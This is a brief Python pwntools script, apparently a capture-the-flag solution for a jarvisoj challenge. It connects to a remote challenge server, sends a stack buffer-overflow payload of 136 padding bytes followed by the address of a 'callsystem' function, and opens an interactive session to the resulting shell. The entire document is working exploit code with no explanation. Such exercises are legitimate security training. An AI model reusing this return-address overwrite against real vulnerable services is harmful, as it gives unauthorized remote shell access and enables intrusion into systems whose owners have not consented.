from pwn import *

p = remote('pwn2.jarvisoj.com', 9881)

callsystem_addr = 0x0000000000400596
paylaod = 'A' * 136 + p64(callsystem_addr)
p.send(paylaod)

p.interactive()
